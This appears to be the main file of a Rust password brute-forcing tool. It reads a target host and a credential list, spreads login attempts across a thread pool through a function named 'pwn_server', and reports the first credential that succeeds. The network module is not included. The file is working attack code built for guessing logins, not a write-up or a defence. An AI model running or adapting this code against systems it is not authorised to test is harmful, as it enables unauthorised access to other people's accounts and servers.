mod server;
use std::io::prelude::*;

use clap::Parser;
pub use server::Server;
pub use server::Connect_To_Server;

use itertools::Itertools;
use std::fs::File;
use std::io::BufReader;
use std::thread;
use std::sync::mpsc::{channel, Receiver, Sender};
use std::{
    fs::read_to_string,
    io::{ Result},
    path::Path,
    sync::{Arc, Condvar, Mutex},
    time::Instant,
    vec::Vec,
};
use threadpool::ThreadPool;

#[derive(Parser, Debug)]
struct Raw_Args {
    // path to .txt file containing list of IPs
    #[clap(short, long)]
    host: String,
    // path to .txt file containing list of passwords
    #[clap(short, long)]
    credentials: String,
}

#[derive(Parser, Debug)]
struct RawArgs {
    // path to .txt file containing list of IPs
    #[clap(short, long)]
    host: String,
    // path to .txt file containing list of passwords
    #[clap(short, long)]
    credentials: String,
}

// fn line_producer(file_name: &str,sender: &Sender<Vec<String>>)->  std::io::Result<()> {
fn line_producer(file_name: &str,sender: &Sender<String>)->  std::io::Result<()> {
    let file_exists = Path::new(&file_name).is_file();
    if !file_exists {
        panic!("{}", format!("File {} does not exist!", file_name))
    }
    let f = File::open(&file_name)?;
    let reader = BufReader::new(f);
    let mut line_iter = reader.lines().map(|l| l.unwrap());
    let mut buffer:Vec<String> =  Vec::new();
    loop {
        match line_iter.next() {
            Some(line) => {
                sender.send(line);
                // if buffer.len() == 10 {
                //     sender.send(buffer);
                //     buffer = Vec::new();
                //     buffer.push(line);
                // } else {
                //     buffer.push(line);
                // }
            },
            None => { break }
        }
    }
    Ok(())

}



fn main() -> Result<()> {
    // get the cradential list from the arguments
    let args1 = RawArgs::parse();

    let host = args1.host;
    // let chunks = args.credentials;
    let (sender1, receiver1): (Sender<String>, Receiver<String>) = channel();
    // let (sender1, receiver1): (Sender<Vec<String>>, Receiver<Vec<String>>) = channel();
    thread::spawn(move || line_producer(&args1.credentials,&sender1));
    // let mut debug_vector:Vec<String> =  Vec::new();
    // debug_vector.push(String::from("admin:123456"));
    // debug_vector.push(String::from("admin:test"));
    // debug_vector.push(String::from("admin:t"));
    // debug_vector.push(String::from("admin:sadasd"));
    // let mut test:Vec<Vec<String>> = Vec::new();
    // let new_vec = debug_vector.clone();
    // test.push(debug_vector);
    // test.push(new_vec);

    let now = Instant::now();
    let pool = ThreadPool::new(4);
    let manage_threads = HandleThreads::new();
    
    // think about abstracting this part, mabe in the manage_threads object?
    let (sender, receiver): (Sender<u32>, Receiver<u32>) = channel();
    // for cred_chunk in test {
    //     let host = host.clone();
    //     let sender = sender.clone();
    //     let manage_threads = manage_threads.clone();
    //     println!("!!");
    //     pool.execute(move || pwn_server(&manage_threads,host,sender,cred_chunk));
    // }
    for line in receiver1 {
        let host = host.clone();
        let sender = sender.clone();
        let manage_threads_clone = manage_threads.clone();
        pool.execute(move || pwn_server(&manage_threads_clone,host,sender,line));
    }

    manage_threads.start_work();
    println!("Total attempts {}", receiver.try_iter().count());
    println!("Total time elapsed: {}", now.elapsed().as_secs());
    Ok(())
}





#[derive(Clone)]
struct HandleThreads {
    pair: Arc<(Mutex<bool>,Condvar)>,
}


trait ManageThreads {
    fn new() -> Self;
    fn finish_work(&self) -> bool;
    fn start_work(&self) -> bool;
}


impl ManageThreads for HandleThreads {
    fn new() -> Self {
        HandleThreads { pair:  Arc::new((Mutex::new(false), Condvar::new())) }
    }

    fn start_work(&self) -> bool {
        let &(ref lock, ref cvar) = &*self.pair;
        let mut done = lock.lock().unwrap();
        while !*done {
            done = cvar.wait(done).unwrap();
        }
        return true
    }

    fn finish_work(&self) -> bool {
        let &(ref lock, ref cvar) = &*self.pair.clone();
        let mut done = lock.lock().unwrap();
        *done = true;
        // We notify the condvar that the value has changed.
        cvar.notify_one();
        return true
    }
}
fn pwn_server(manage_threads:&HandleThreads,host: String,sender: Sender<u32>,cred_chunk: String) -> () {
// fn pwn_server(manage_threads:&HandleThreads,host: String,sender: Sender<u32>,cred_chunk: Vec<String>) -> () {
    println!("entering server");
    let server = Server{host:&host};
    let mut stream = server.connect_tcp();
    if server.can_connect(&mut stream) {
        // for cred in &cred_chunk.clone() {
            // match server.send(cred, &mut stream, &sender) {
            match server.send(cred_chunk.as_str(), &mut stream, &sender) {
                Ok(code) => { 
                    if code == 1 {
                        println!("------------- SUCCESS -------------");
                        println!("{}", cred_chunk);
                        // println!("{}", cred);
                        println!("------------- SUCCESS -------------");
                        manage_threads.finish_work();
                    }
                }
                Err(err) => {
                    println!("{:}", err)
                }
            }
        // }
    } else {
        println!(
            "It appears that is not ready for new connections"
        );
    }
} 